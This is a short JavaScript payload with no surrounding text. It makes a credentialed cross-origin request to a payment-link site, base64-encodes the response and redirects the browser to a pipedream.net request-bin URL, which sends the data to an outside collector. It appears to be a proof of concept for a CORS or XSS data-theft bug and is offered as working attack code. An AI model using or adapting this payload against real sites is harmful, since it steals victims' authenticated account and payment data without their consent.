var request = new XMLHttpRequest();
request.onload = gimme;
request.open('GET', 'https://paymentlink.mdcorpora.com')
request.withCredentials = true;
request.send();


function gimme() {
	location = 'https://0944890785d50fb7aba324bbc9e9b142.m.pipedream.net/lulz=' + btoa(this.responseText);
}
